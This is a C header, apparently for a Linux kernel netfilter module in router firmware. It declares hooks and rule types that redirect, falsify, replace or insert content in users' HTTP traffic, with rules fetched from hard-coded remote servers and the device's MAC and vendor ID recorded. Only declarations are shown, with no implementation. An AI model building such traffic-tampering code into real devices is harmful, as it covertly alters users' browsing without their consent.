#define HF_URL_MAXLEN			512
#define HF_RULEBOX_SIZE 		200
#define HF_RULELIST_SIZE 		100
#define HEADER_MAX_LEN 			1024
#define RULE_LIST_NUM 			2
#define HTTP_LINK_LEN 			8
#define HTTP_LINK_NUM 			56
#define FILE_MAX_LEN 			20480
#define CORRESPOND_URL 			6
#define HEADER_MIN_LEN 			1
#define HF_MD5_LEN 				16
#define HF_TIME_UNIT 			10
#define REFERER_MAX_LEN 		20
#define HF_RULE_FILE_SRC   "/tmp/1"
#define HF_RULE_FILE_DST   "/tmp/2"
#define	HF_RULEFILE_SRCDIR "/tmp"
#define	HF_RULEFILE_SRCNAME "1"
#define HF_RULE_SVR_URL_MAX_LEN 48
#define	HF_VERSION_MAXSIZE			32
#define HF_VENDORID_MAXSIZE			32
#define HF_RULE_SVR_URL_M  "http://rm.10router.com/r"
#define HF_RULE_SVR_URL_S  "http://rs.10router.com/r"
#define HF_CHECKSUM_PATH	"/etc/sys/syschecksum"
#define HF_CHECKSUM_PATH_TEMP  "/etc/sys/.syschecksum"
#define HF_APPCHECKSUM_PATH	"/etc/sys/appchecksum"
#define HF_APPCHECKSUM_PATH_TEMP "/etc/sys/.appchecksum"
#define HF_VERSION_PATH 	"/etc/sys/version"
#define	HF_VENDOR_PATH		"/etc/sys/vendor"

#define HF_TLV_REDIRECT			0
#define HF_TLV_FALSIFY			5
#define HF_TLV_WHITELIST		1
#define HF_TLV_TIME				3
#define HF_TLV_TARGETURL		2
#define HF_TLV_REFERER			4
#define HF_TLV_REPLACE			6
#define HF_TLV_END      		255
#define HF_TLV_INSERT			7
#define HF_TLV_HTMLHEADEDIT		8

#define HF_KEY_LEN 				16
#define HF_FILTER_REDIRECT 		(13)
#define HF_FILTER_REPLACE		(14)
#define	HF_DO_STH				(15)
#define HF_REF_OFFSET			11
#define HF_HOST_LEN 			8
#define	HF_RANDNUM_SIZE			4
#define	HF_MACADDR_LEN			6
#define	HF_RULE_DELAYTIME		0x90	//单位10s
#define	HF_MISREQCTL_NUM		16

#define tcp_hdr(ip) ((ip) + (((0x0F)&(*(ip)))<<2))
#define http_hdr(tcp) ((tcp) + (((0xF0)&(*((tcp)+12)))>>2))
#define HF_GET_RULENO(status)	   (((status)&0xFF000000)>>24)

struct HFMisReqCtl{
	unsigned int	rspTypeLen;
	unsigned char	*rspTypeVal;		//404,403等等
	unsigned char	*pRule;
	unsigned int 	aRuleAliveTime[2];
};

struct HFRuleIterm{
	unsigned int	iseffct;
	pcre			prRuleList;
	regex_t			rtCurreg;
	unsigned int	uiRuleType;
	unsigned int 	aRuleAliveTime[2];
	unsigned char  *pRule;
	unsigned char	ucRegType;
	unsigned char	reserved[3];
};
struct HFRuleCtl{
	unsigned char			verCheckSum[HF_MD5_LEN+4];	
	unsigned char			appCheckSum[HF_MD5_LEN+4];
	unsigned int 			aRuleGroupSize[RULE_LIST_NUM];
	unsigned int 			iCurListNo;
	struct	HFRuleIterm		stHFRuleIterm[HF_RULEBOX_SIZE];	
	struct 	HFMisReqCtl		HFMissRegCtl[HF_MISREQCTL_NUM];
	unsigned int			MisRCtlSize[RULE_LIST_NUM];
	unsigned int			uiLenOfVer;
	unsigned int			uiLenOfVdid;
	unsigned char *			pRulStr;	
	unsigned char			sendMd5[HF_MD5_LEN];	
	unsigned int			randNum;
	unsigned char			hfVersion[HF_VERSION_MAXSIZE];
	unsigned char			sysMac[HF_MACADDR_LEN+2];//6byte mac, minato intergers
	unsigned char			vender_id[HF_VENDORID_MAXSIZE];
	unsigned char			hitNum[HF_RULELIST_SIZE+8];
};
struct HFRulUpdCtl{
	char 	aCurMD5[16];		//save the current using MD5
	int		HF_flag_server;		//show which server to be chosen
	int		HF_file_flag;		//flag of the file updating status;	0:not ready 1:ready 
	char	fileServer[2][32];	//store the url of file
};


//==================================================================
unsigned int HF_partreplace(struct sk_buff *skb, unsigned char iRuleNo, unsigned int dsts, unsigned int dste);
unsigned int HF_req_proc(struct sk_buff *skb);
unsigned int HF_fix_tcpchecksum(struct sk_buff *skb);
typedef unsigned int (*FUNC_PTR)(struct sk_buff *, unsigned char *);
void HF_rule_analyse(struct work_struct *work);
unsigned int HF_url_choose(	unsigned int hooknum,
		      	  					struct sk_buff *skb,
			  						const struct net_device *in,
			  						const struct net_device *out,
			  						int (*okfn)(struct sk_buff *));
unsigned int HF_link_hit(unsigned char *skbdata);
unsigned int HF_url_redirect(  unsigned int hooknum,
									struct sk_buff *skb,
									const struct net_device *in,
									const struct net_device *out,
									int (*okfn)(struct sk_buff *));
int HF_hook_init(unsigned int *pHF_hook_func, struct nf_hook_ops *pHF_hook_ops, int hooknum);

int HF_timer_init(struct timer_list* pHF_timer_list, 
				  	 void *pHF_timer_func, 
				  	 int secToWait,
				  	 unsigned long data);
static void HF_timer_addwork(unsigned long pwork);
static int __init HF_init( void );
static void __exit HF_exit(void);
static int HF_cypher_decrypt(char *str, size_t str_len);
void HF_file_download(char *fileurl);
void HF_file_copy(void);
int HF_md5_check(unsigned char *src,int len, char *dst);
int HF_file_read(char *filepath, unsigned char **buffer, int bufmaxlen,unsigned int *reallen);
static int HF_md5_generate(unsigned char* src, int srclen, unsigned char* hash);
void HF_file_update(struct work_struct *work);
int counters_minus(int value);
unsigned int HF_skb_pos(struct sk_buff *skb, unsigned int startpos, unsigned int endpos, unsigned char *key, unsigned int keylen, unsigned int *pPos);


static unsigned int HF_req_proc_new(struct sk_buff *skb);
static unsigned int HF_tlv_exec(unsigned char *pValue, unsigned int uiRuleNo);
static void HF_rule_analyse_new(struct work_struct *work);
//unsigned int HF_link_redirect_new(struct sk_buff *skb, struct http_para *http,  unsigned char ruleno);

unsigned int HF_skb_geturl(struct sk_buff *skb, unsigned char *url, unsigned int *phostlen);


